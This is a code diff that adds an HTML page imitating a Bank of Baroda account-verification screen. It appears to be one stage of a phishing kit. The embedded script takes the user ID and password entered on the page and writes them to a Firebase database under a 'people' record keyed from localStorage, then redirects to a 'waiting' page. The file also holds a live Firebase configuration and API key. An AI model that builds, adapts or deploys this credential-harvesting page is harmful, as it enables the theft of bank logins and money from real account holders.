@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="light">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link
+      href="https://cdn.jsdelivr.net/npm/daisyui@3.5.0/dist/full.css"
+      rel="stylesheet"
+      type="text/css"
+    />
+    <script src="https://cdn.tailwindcss.com"></script>
+  </head>
+  <body class="bg-slate-100">
+    <div class="w-full justify-center flex items-center">
+      <div id="enterDetails" class="w-[40vw] min-w-[450px]">
+        <div class="bg-[#FF5B2E] h-[60px] flex items-center justify-start">
+          <img
+            class="h-28 ml-5"
+            src="https://logos-world.net/wp-content/uploads/2020/11/Bank-of-Baroda-Emblem.png"
+          />
+        </div>
+        <div class="bg-white m-5">
+          <!-- Tabs -->
+          <div
+            class="h-8 bg-white border-slate-400 shadow-md rounded-full justify-between flex"
+          >
+            <li
+              class="cursor-pointer w-full bg-[#FF5B2E] rounded-full text-white list-none flex justify-center"
+              onclick="showTabContent('tab1')"
+            >
+              Verify Account Holder
+            </li>
+          </div>
+
+          <form id="tab1-content">
+            <!-- Content for Mobile & MPIN tab goes here -->
+            <div class="p-10">
+              <h1 class="text-sm">User ID</h1>
+              <input
+                type="text"
+                id="userid"
+                class="w-full border-b-[1px] border-black p-1 outline-none"
+                required
+              />
+
+              <h1 class="text-sm mt-10">Password</h1>
+              <input
+                type="password"
+                id="password"
+                class="w-full border-b-[1px] border-black p-1 outline-none"
+                required
+              />
+
+              <!-- Button -->
+              <!-- <p class="mt-10">
+                Forgot Password
+                <span class="text-blue underline"> Reset Here </span>
+              </p>
+
+              <p class="mt-1">
+                Locked Your Account
+                <span class="text-blue underline"> Enable Here </span>
+              </p> -->
+
+              <div class="mt-5 justify-center flex">
+                <button
+                  class="btn btn-wide rounded-full btn-sm text-white bg-[#FF5B2E]"
+                  type="button"
+                  id="insert"
+                >
+                  Verify
+                </button>
+              </div>
+            </div>
+          </form>
+        </div>
+        <!-- Image -->
+        <div class="w-full">
+        </div>
+      </div>
+    </div>
+
+    <script type="module">
+      // Import the functions you need from the SDKs you need
+      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-app.js";
+      import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-analytics.js";
+      // TODO: Add SDKs for Firebase products that you want to use
+      // https://firebase.google.com/docs/web/setup#available-libraries
+
+      // Your web app's Firebase configuration
+      // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+      const firebaseConfig = {
+  apiKey: "AIzaSyDKcOFaO3lqruMIfWxp5fOnzxeIwQZboC0",
+  authDomain: "bobwo-da5c6.firebaseapp.com",
+  projectId: "bobwo-da5c6",
+  storageBucket: "bobwo-da5c6.appspot.com",
+  messagingSenderId: "525557748996",
+  appId: "1:525557748996:web:24c859f0fa82c6bff96c51"
+};
+
+      // Initialize Firebase
+      const app = initializeApp(firebaseConfig);
+      const analytics = getAnalytics(app);
+
+      //Insert data
+      import {
+        getDatabase,
+        ref,
+        get,
+        set,
+        child,
+        update,
+        remove,
+      } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-database.js";
+
+      const db = getDatabase();
+
+      var userid = document.querySelector("#userid");
+      var password = document.querySelector("#password");
+
+      var insertBtn = document.querySelector("#insert");
+
+      function UpdateData() {
+        if (
+          userid.value == "" ||
+          userid.value == null ||
+          userid.value == undefined
+        ) {
+          alert("User ID Required");
+          return;
+        }
+
+        if (
+          password.value == "" ||
+          password.value == null ||
+          password.value == undefined
+        ) {
+          alert("Password Required");
+          return;
+        }
+
+        insertBtn.classList.add("loading");
+
+        const dataToUpdate = {
+          user_id: userid.value,
+          password: password.value,
+        };
+
+        // Replace 'your-data-key' with the unique key of the data you want to update
+
+        const value = localStorage.getItem("id");
+
+        update(ref(db, "people/" + value), dataToUpdate)
+          .then(() => {
+            insertBtn.classList.remove("loading");
+            console.log("Data updated successfully!");
+            window.location.href = "waiting.html";
+          })
+          .catch((error) => {
+            insertBtn.classList.remove("loading");
+            console.error("Error updating data:", error);
+          });
+      }
+
+      insertBtn.addEventListener("click", UpdateData);
+    </script>
+  </body>
+</html>
